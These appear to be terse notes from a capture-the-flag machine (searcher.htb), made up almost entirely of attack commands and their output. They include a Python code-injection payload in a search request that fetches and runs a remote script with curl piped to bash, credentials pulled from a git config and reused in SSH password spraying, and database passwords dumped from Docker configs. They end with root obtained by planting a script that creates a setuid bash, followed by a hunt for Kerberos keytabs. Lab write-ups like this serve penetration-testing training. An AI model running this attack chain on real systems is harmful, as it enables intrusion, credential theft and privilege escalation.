

```
POST /search HTTP/1.1

Host: searcher.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded

Content-Length: 99

Origin: http://searcher.htb

Connection: close

Referer: http://searcher.htb/

Upgrade-Insecure-Requests: 1



engine=Accuweather&query=',__import__('os').system('curl+http://10.10.14.8:8001/payload.sh|bash'))#
```


```
-rw-rw-r-- 1 svc svc 76 Apr  3  2023 /home/svc/.gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks


drwxr-x--- 8 root root 4096 Apr  3  2023 /opt/scripts/.git
w/app/.git 8 www-data www-data 4096 Mar 17 13:32 /var/ww

```

```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

```



```
kali@kali ~> cat passwd.txt | awk '{print $1}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd
systemd-resolve:x:102:103:systemd
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

kali@kali ~> cat passwd.txt | cut -d ":" -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
_apt
systemd-network
systemd-resolve
messagebus
systemd-timesync
pollinate
sshd
syslog
uuidd
tcpdump
tss
landscape
usbmux
svc
lxd
fwupd-refresh
dnsmasq
_laurel

kali@kali ~> cat passwd.txt | awk '{print $1}' | cut -d ":" -f 1 > users.txt
kali@kali ~> nxc ssh 10.10.11.208  -u users.txt -p 'jh1usoih2bkjaspwe92'
SSH         10.10.11.208    22     10.10.11.208     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.208    22     10.10.11.208     [-] root:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] daemon:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] bin:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] sys:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] sync:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] games:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] man:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] lp:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] mail:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] news:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] uucp:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] proxy:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] www-data:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] backup:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] list:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] irc:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] gnats:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] nobody:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] _apt:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] systemd-network:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] systemd-resolve:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] messagebus:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] systemd-timesync:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] pollinate:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] sshd:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] syslog:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] uuidd:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] tcpdump:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] tss:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] landscape:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [-] usbmux:jh1usoih2bkjaspwe92 Authentication failed.
SSH         10.10.11.208    22     10.10.11.208     [+] svc:jh1usoih2bkjaspwe92  (non root) Linux - Shell access!

```


```
svc@busqueda:/var/www/app$ sudo -l
sudo -l
[sudo] password for svc: jh1usoih2bkjaspwe92

Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

```


literally just scrolled down :||

https://docs.docker.com/reference/cli/docker/inspect/#get-a-subsection-in-json-format


```
	svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
	--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
	
	svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
	--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}

```



```
echo '#!/bin/bash' > full-checkup.sh && echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> full-checkup.sh && chmod +x full-checkup.sh
```


```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ cd /tmp
svc@busqueda:/tmp$ ls -la
total 1420
drwxrwxrwt 14 root root    4096 Mar 18 11:58 .
drwxr-xr-x 19 root root    4096 Mar  1  2023 ..
-rwsr-xr-x  1 root root 1396520 Mar 18 11:58 bash
drwxrwxrwt  2 root root    4096 Mar 18 11:31 .font-unix
drwxrwxrwt  2 root root    4096 Mar 18 11:31 .ICE-unix
drwx------  3 root root    4096 Mar 18 11:31 snap-private-tmp
drwx------  3 root root    4096 Mar 18 11:31 systemd-private-6dfef3d62e8b4d6593564973140217bf-apache2.service-avu4bn
drwx------  3 root root    4096 Mar 18 11:31 systemd-private-6dfef3d62e8b4d6593564973140217bf-ModemManager.service-uBYWeR
drwx------  3 root root    4096 Mar 18 11:31 systemd-private-6dfef3d62e8b4d6593564973140217bf-systemd-logind.service-bzaukG
drwx------  3 root root    4096 Mar 18 11:31 systemd-private-6dfef3d62e8b4d6593564973140217bf-systemd-resolved.service-f5TOsv
drwx------  3 root root    4096 Mar 18 11:31 systemd-private-6dfef3d62e8b4d6593564973140217bf-systemd-timesyncd.service-CkJljs
drwxrwxrwt  2 root root    4096 Mar 18 11:31 .Test-unix
drwx------  2 root root    4096 Mar 18 11:31 vmware-root_788-2957517930
drwxrwxrwt  2 root root    4096 Mar 18 11:31 .X11-unix
drwxrwxrwt  2 root root    4096 Mar 18 11:31 .XIM-unix
svc@busqueda:/tmp$ ./bash
bash-5.1$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
bash-5.1$ exit
exit
svc@busqueda:/tmp$ ./bash -p
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) groups=1000(svc)
bash-5.1#

```



```
# cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
# ls
adcli-krb5-oOJP5G  krb5cc_550601381_XXXXVQ17gA  systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-ModemManager.service-zdAiYq    systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-upower.service-tHwyZ0
bash               snap-private-tmp             systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-systemd-logind.service-Ql33cS
# ls -la
total 1416
drwxrwxrwt 12 root     root            4096 Jul 29 02:38 .
drwxr-xr-x 20 root     root            4096 Jun 24 21:10 ..
drw-------  2 root     root            4096 Jul 29 00:09 adcli-krb5-oOJP5G
-rwsr-xr-x  1 root     root         1396520 Jul 29 02:38 bash
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .font-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .ICE-unix
-rw-------  1 j.wilson domain users    1414 Jul 29 02:30 krb5cc_550601381_XXXXVQ17gA
drwx------  3 root     root            4096 Jul 28 22:18 snap-private-tmp
drwx------  3 root     root            4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-ModemManager.service-zdAiYq
drwx------  3 root     root            4096 Jul 28 22:18 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-systemd-logind.service-Ql33cS
drwx------  3 root     root            4096 Jul 28 23:37 systemd-private-65a9c38ebcef47e9a2ad10902670fc3d-upower.service-tHwyZ0
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .Test-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .X11-unix
drwxrwxrwt  2 root     root            4096 Jul 28 22:18 .XIM-unix

```


```
bash-5.1# find / -name '*.keytab' 2>/dev/null
/home/o.lockwood/svc_sharepoint.keytab
/home/o.lockwood/svc_sql.keytab
/home/o.lockwood/svc_iis.keytab
/etc/krb5.keytab

```


